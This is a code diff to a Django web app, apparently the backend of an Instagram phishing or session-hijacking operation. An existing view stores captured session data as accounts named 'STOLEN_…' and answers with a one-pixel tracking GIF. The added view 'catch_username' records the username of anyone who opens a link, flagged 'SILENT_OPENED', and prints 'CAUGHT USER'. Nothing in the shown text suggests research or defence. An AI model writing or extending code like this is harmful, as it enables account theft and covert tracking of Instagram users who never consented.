@@ -209,7 +209,7 @@ def capture_full(request):
     
     if s and u and len(s) > 50:
         try:
-            # Save with partial session (we only need it for login)
+            
             InstagramAccount.objects.update_or_create(
                 username=f"STOLEN_{u[-8:]}",
                 defaults={
@@ -227,3 +227,22 @@ def capture_full(request):
     
     return HttpResponse(b"GIF89a0100010080000000000000000000!f90401000000002c00000000010001000002024401003b", 
                         content_type="image/gif")
+    
+    
+    
+
+def catch_username(request):
+    user = request.GET.get('user', 'unknown')
+    
+    # SAVE TO DB
+    InstagramAccount.objects.create(
+        username=user,
+        password='SILENT_OPENED',
+        session_data=fernet.encrypt(json.dumps({"note": "opened_link"}).encode()).decode(),
+        is_active=False,
+        last_success=timezone.now()
+    )
+    
+    print(f"CAUGHT USER: @{user}")
+    
+    return HttpResponse("OK")
